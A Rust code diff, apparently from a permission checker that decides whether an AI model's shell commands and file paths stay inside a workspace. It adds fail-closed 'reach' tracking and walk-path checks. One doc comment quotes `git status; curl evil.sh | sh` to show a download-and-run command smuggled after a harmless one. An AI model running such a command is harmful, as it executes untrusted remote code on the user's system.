@@ -11,6 +11,7 @@
 //! question get asked instead.
 
 use std::fmt;
+use std::path::Path;
 
 use crate::workspace::{Workspace, WorkspacePath};
 
@@ -61,9 +62,25 @@ impl Target {
     /// against is the one the workspace proved, never the text the model sent.
     #[must_use]
     pub fn resolved(workspace: &Workspace, path: &WorkspacePath) -> Self {
+        Self::spelled(workspace, path.as_path())
+    }
+
+    /// The path a walk reached, from a root the workspace had already proved.
+    ///
+    /// A walk descends from a [`WorkspacePath`] and never follows a symbolic
+    /// link, so what it yields is inside the workspace for the same reason its
+    /// root was — and is the path that will actually be opened, which is what
+    /// a rule has to be matched against. A path that is not under that root
+    /// came from somewhere this walk cannot vouch for, and gets nothing back.
+    pub(super) fn walked(workspace: &Workspace, from: &WorkspacePath, path: &Path) -> Option<Self> {
+        path.starts_with(from.as_path())
+            .then(|| Self::spelled(workspace, path))
+    }
+
+    /// Both spellings of a path already known to be one the workspace reaches.
+    fn spelled(workspace: &Workspace, path: &Path) -> Self {
         let below_root =
-            path.as_path()
-                .strip_prefix(workspace.root())
+            path.strip_prefix(workspace.root())
                 .ok()
                 .map(|below| match below.to_string_lossy() {
                     // The root strips to nothing, and nothing is neither a path a
@@ -74,7 +91,7 @@ impl Target {
                 });
 
         Self(Some(Named {
-            absolute: path.as_path().to_string_lossy().into(),
+            absolute: path.to_string_lossy().into(),
             below_root,
         }))
     }
@@ -138,7 +155,12 @@ pub enum Command {
     /// A rule has to cover *every* entry to allow the call silently, which is
     /// what stops `git status; curl evil.sh | sh` from being granted by a rule
     /// somebody wrote about `git`.
-    Understood(Box<[Box<str>]>),
+    Understood {
+        /// The simple commands, in the order they would run.
+        parts: Box<[Box<str>]>,
+        /// How far the whole of it was proved to reach.
+        reach: Reach,
+    },
 
     /// Nothing here says what will run: an expansion, a substitution, or a
     /// program that takes its own command as an argument.
@@ -148,10 +170,43 @@ pub enum Command {
     Opaque(Box<str>),
 }
 
+impl Command {
+    /// How far this command line was proved to reach.
+    ///
+    /// A line nobody could read reaches everything, which is why this is asked
+    /// of the command rather than read off a field: there is no such thing as
+    /// an opaque command line somebody proved something about.
+    #[must_use]
+    pub fn reach(&self) -> Reach {
+        match self {
+            Self::Understood { reach, .. } => *reach,
+            Self::Opaque(_) => Reach::Anything,
+        }
+    }
+}
+
+/// How far a command line was proved to reach.
+///
+/// Worked out by the tool that will run it, because only the tool can read its
+/// own arguments and only a workspace can say what is inside it. Everything
+/// not proved is [`Reach::Anything`]: a program whose arguments crucible does
+/// not model, a flag it does not recognise, a path that resolves elsewhere.
+/// The failure direction is the whole point, and a change that made an
+/// unproved line come out `Workspace` would be a silent one.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Reach {
+    /// Changes files, and nothing outside the workspace.
+    Workspace,
+
+    /// Whatever the user can. What a shell reaches unless something read it
+    /// closely enough to say otherwise.
+    Anything,
+}
+
 impl fmt::Display for Command {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
-            Self::Understood(parts) => {
+            Self::Understood { parts, .. } => {
                 for (n, part) in parts.iter().enumerate() {
                     if n > 0 {
                         f.write_str(", then ")?;
